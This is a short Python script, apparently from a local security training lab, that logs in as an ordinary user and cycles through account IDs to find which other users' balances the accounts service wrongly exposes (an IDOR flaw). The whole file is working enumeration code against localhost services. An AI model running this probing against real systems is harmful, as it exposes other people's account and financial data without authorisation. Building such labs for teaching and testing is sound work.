#!/usr/bin/env python3
"""IDOR / broken access control enumeration helper.

This script assumes the lab services are running locally via `./scripts/run_lab.sh`.

Steps:
- obtain a token from auth-service as a normal user,
- iterate over a range of account IDs,
- report which accounts are accessible and who they belong to.
"""

from __future__ import annotations

import argparse
import sys
from typing import Tuple

import requests

AUTH_URL = "http://localhost:8001/login"
ACCOUNTS_BASE = "http://localhost:8002"


def get_token(username: str, password: str) -> str:
    resp = requests.post(AUTH_URL, json={"username": username, "password": password})
    if resp.status_code != 200:
        raise SystemExit(f"login failed: {resp.status_code} {resp.text}")
    data = resp.json()
    return data["access_token"]


def probe_account(token: str, account_id: int) -> Tuple[bool, str]:
    resp = requests.get(
        f"{ACCOUNTS_BASE}/accounts/{account_id}/balance",
        headers={"Authorization": f"Bearer {token}"},
    )
    if resp.status_code == 200:
        data = resp.json()
        owner = data.get("owner_user_id")
        balance = data.get("balance")
        return True, f"id={account_id} owner_user_id={owner} balance={balance}"
    return False, f"id={account_id} inaccessible (status={resp.status_code})"


def main() -> None:
    parser = argparse.ArgumentParser(description="Enumerate account IDs via IDOR-style probing")
    parser.add_argument("--username", default="alice")
    parser.add_argument("--password", default="password123")
    parser.add_argument("--start", type=int, default=2000)
    parser.add_argument("--end", type=int, default=2010)
    args = parser.parse_args()

    token = get_token(args.username, args.password)
    print(f"[idor] got token for {args.username}")

    for account_id in range(args.start, args.end + 1):
        ok, msg = probe_account(token, account_id)
        if ok:
            print(f"[HIT] {msg}")
        else:
            print(f"[MISS] {msg}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(1)
